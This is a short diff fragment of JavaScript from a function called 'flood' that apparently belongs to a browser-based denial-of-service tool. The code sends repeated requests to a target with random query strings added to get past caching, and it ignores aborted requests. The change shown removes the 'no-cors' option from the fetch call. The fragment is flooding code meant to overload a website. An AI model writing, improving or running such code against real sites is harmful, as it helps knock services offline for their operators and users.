@@ -67,7 +67,7 @@ async function flood(target) {
     }
     rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
     queue.push(
-      fetchWithTimeout(target+rand, { timeout: 1000, mode: 'no-cors' })
+      fetchWithTimeout(target+rand, { timeout: 1000 })
         .catch((error) => {
           if (error.code === 20 /* ABORT */) {
             return;
